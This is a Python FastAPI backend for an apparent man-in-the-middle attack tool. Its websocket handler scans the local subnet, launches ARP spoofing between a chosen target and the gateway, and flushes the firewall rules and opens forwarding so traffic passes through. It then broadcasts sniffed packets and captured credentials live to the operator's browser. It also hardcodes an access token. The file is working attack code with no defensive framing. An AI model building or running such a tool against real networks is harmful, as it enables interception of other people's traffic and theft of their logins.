from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from contextlib import asynccontextmanager
import uvicorn
import asyncio
import os
import json
import subprocess
import re

from core.network import NetworkScanner
from core.mitm import ARPSpoofer
from core.sniffer import SnifferEngine

ACCESS_TOKEN = "V$j(Vqm,}XF,9i_|HZtL" 

@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.loop = asyncio.get_running_loop()
    app.state.engine_lock = asyncio.Lock()
    yield

app = FastAPI(lifespan=lifespan)
app.mount("/static", StaticFiles(directory="static"), name="static")

class ConnectionManager:
    def __init__(self):
        self.active_connections = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                print(f"Broadcast error: {e}")

manager = ConnectionManager()

def on_log_callback(message, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "log", "message": message}), loop)

def on_host_callback(hosts, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "hosts", "data": hosts}), loop)

def on_credential_callback(creds, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "credential", "data": creds}), loop)

def on_traffic_callback(rx, tx, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "traffic", "rx": rx, "tx": tx}), loop)

def on_packet_callback(pkt_data, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "packet", "data": pkt_data}), loop)

def get_interfaces():
    try:
        result = subprocess.run(["ip", "link"], capture_output=True, text=True)
        interfaces = re.findall(r"\d+: (\w+):", result.stdout)
        return interfaces if interfaces else ["eth0"]
    except Exception as e:
        print(f"Interface error: {e}")
        return ["eth0"]

def get_subnet(interface):
    try:
        result = subprocess.run(["ip", "route", "list", "dev", interface], capture_output=True, text=True)
        match = re.search(r"(\d+\.\d+\.\d+\.\d+/\d+)", result.stdout)
        return match.group(1) if match else "192.168.1.0/24"
    except Exception:
        return "192.168.1.0/24"

def get_gateway():
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        match = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", result.stdout)
        return match.group(1) if match else None
    except Exception:
        return None

@app.get("/api/interfaces")
async def api_interfaces():
    return {"interfaces": get_interfaces()}

@app.get("/")
async def get_index():
    with open(os.path.join("static", "index.html"), "r") as f:
        return HTMLResponse(content=f.read())

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = Query(...)):
    if token != ACCESS_TOKEN:
        await websocket.close(code=1008)
        return

    await manager.connect(websocket)
    loop = app.state.loop
    
    scanner_engine = None
    mitm_engine = None
    sniffer_engine = None
    selected_interface = "eth0"

    try:
        while True:
            data = await websocket.receive_text()
            try:
                msg = json.loads(data)
            except json.JSONDecodeError:
                continue

            action = msg.get("action")
            if not action:
                continue

            async with app.state.engine_lock:
                if action == "set_interface":
                    iface = msg.get("interface")
                    if not iface or iface == selected_interface: continue
                    
                    if scanner_engine: await asyncio.to_thread(scanner_engine.stop); scanner_engine = None
                    if mitm_engine: await asyncio.to_thread(mitm_engine.stop); mitm_engine = None
                    if sniffer_engine: await asyncio.to_thread(sniffer_engine.stop); sniffer_engine = None
                    
                    selected_interface = iface
                    on_log_callback(f"[*] Interface switched to {selected_interface}", loop)
                    
                elif action == "start_scan":
                    if not scanner_engine or not scanner_engine.is_alive():
                        scanner_engine = NetworkScanner(selected_interface, lambda m: on_log_callback(m, loop), lambda h: on_host_callback(h, loop))
                        subnet = get_subnet(selected_interface)
                        scanner_engine.start(subnet)
                        
                elif action == "stop_scan":
                    if scanner_engine:
                        await asyncio.to_thread(scanner_engine.stop)
                        scanner_engine = None

                elif action == "start_mitm":
                    target_ip = msg.get("target_ip")
                    target_mac = msg.get("target_mac", "Unknown_MAC")
                    if not target_ip:
                        on_log_callback("[-] Target IP is missing!", loop)
                        continue

                    gateway = get_gateway()
                    if not gateway:
                        on_log_callback("[-] Could not find default gateway! Aborting.", loop)
                        continue

                    subprocess.run(["iptables", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["iptables", "-P", "FORWARD", "ACCEPT"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.send_redirects=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.send_redirects=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.rp_filter=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.rp_filter=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    on_log_callback("[*] Transparent Bridge enabled.", loop)
                    
                    sniffer_engine = SnifferEngine(
                        selected_interface, target_ip, target_mac, 
                        lambda m: on_log_callback(m, loop), 
                        lambda c: on_credential_callback(c, loop), 
                        lambda rx, tx: on_traffic_callback(rx, tx, loop), 
                        lambda p: on_packet_callback(p, loop)
                    )
                    sniffer_engine.start()
                    
                    mitm_engine = ARPSpoofer(selected_interface, target_ip, gateway, target_mac, lambda m: on_log_callback(m, loop))
                    mitm_engine.start()

                elif action == "stop_mitm":
                    if mitm_engine:
                        await asyncio.to_thread(mitm_engine.stop)
                        mitm_engine = None
                    if sniffer_engine:
                        await asyncio.to_thread(sniffer_engine.stop)
                        sniffer_engine = None

                    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.send_redirects=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.send_redirects=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", "net.ipv4.conf.all.rp_filter=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["sysctl", "-w", f"net.ipv4.conf.{selected_interface}.rp_filter=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                    on_log_callback("[*] Network restored to default settings.", loop)

    except WebSocketDisconnect:
        if scanner_engine: await asyncio.to_thread(scanner_engine.stop)
        if mitm_engine: await asyncio.to_thread(mitm_engine.stop)
        if sniffer_engine: await asyncio.to_thread(sniffer_engine.stop)
        manager.disconnect(websocket)

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=9000, reload=False)